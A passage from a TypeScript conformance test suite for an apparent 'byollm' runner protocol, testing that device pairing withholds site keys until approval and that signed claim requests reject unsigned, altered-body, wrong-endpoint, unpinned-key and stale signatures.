              deviceCode: pairing.deviceCode,
            }),
          }),
        );
        return (await response.json()) as Record<string, unknown>;
      };

      // 3. Before approval, nothing. An unapproved code must not be a way to
      //    enumerate a site's keys.
      const pending = await poll();
      assert(
        pending["site"] === undefined,
        "a pending poll disclosed the site's keys before anyone approved",
      );

      // 4. After approval, the site's identity arrives and verifies.
      await target.approvePairing(pairing.userCode, "alice");
      const approved = await poll();
      assert(
        approved["status"] === "approved",
        `poll after approval said "${String(approved["status"])}"`,
      );

      const site = PublicIdentity.safeParse(approved["site"]);
      assert(site.success, "the approval carried no usable site identity");
      assert(
        verifyPublicIdentity(site.data),
        "the site's encryption key is not signed by the identity it presented",
      );
    },
  },

  {
    id: "C025_SIGNED_REQUESTS",
    title: "authentication is a signature over the request, not a secret",
    musts: ["REQUESTS_SIGNED_NOT_BEARER"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, { owner: "alice" });
      try {
        const body = JSON.stringify({
          protocolVersion: PROTOCOL_VERSION,
          runnerId: daemon.runnerId,
          capabilities: await daemon.runner.detectCapabilities(),
          max: 1,
        });

        const post = (headers: Record<string, string>): Promise<Response> =>
          target.fetch(
            new Request(`${target.origin}/byollm/claim`, {
              method: "POST",
              headers: { "content-type": "application/json", ...headers },
              body,
            }),
          );

        const sign = (over: Partial<{ body: string; endpoint: string }> = {}) =>
          signRequest(daemon.keys, {
            endpoint: over.endpoint ?? "claim",
            runnerId: daemon.runnerId,
            issuedAt: Date.now(),
            body: over.body ?? body,
          });

        const headersFor = (s: {
          runnerId: string;
          issuedAt: number;
          signature: string;
        }): Record<string, string> => ({
          "x-byollm-runner": s.runnerId,
          "x-byollm-issued-at": String(s.issuedAt),
          "x-byollm-signature": s.signature,
        });

        // A correct signature is accepted.
        assert(
          (await post(headersFor(sign()))).status === 200,
          "a correctly signed request was refused",
        );

        // No signature at all.
        assert(
          (await post({})).status === 401,
          "an unsigned request was accepted",
        );

        // A signature over a different body. This is the one that matters:
        // without it an intermediary can keep a valid signature and change
        // what the request asks for.
        assert(
          (await post(headersFor(sign({ body: '{"other":true}' })))).status ===
            401,
          "a signature over different bytes was accepted",
        );

        // A signature made for another endpoint, replayed here.
        assert(
          (await post(headersFor(sign({ endpoint: "release" })))).status ===
            401,
          "a signature for another endpoint was accepted",
        );

        // A signature from a key nobody pinned.
        const stranger = signRequest(generateKeys(Date.now()), {
          endpoint: "claim",
          runnerId: daemon.runnerId,
          issuedAt: Date.now(),
          body,
        });
        assert(
          (await post(headersFor(stranger))).status === 401,
          "a signature from an unpinned key was accepted",
        );

        // And a stale one, well outside any reasonable clock skew.
        const stale = signRequest(daemon.keys, {
          endpoint: "claim",
          runnerId: daemon.runnerId,
          issuedAt: Date.now() - 86_400_000,
          body,
        });
        assert(
          (await post(headersFor(stale))).status === 401,
          "a signature from a day ago was accepted",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },
];
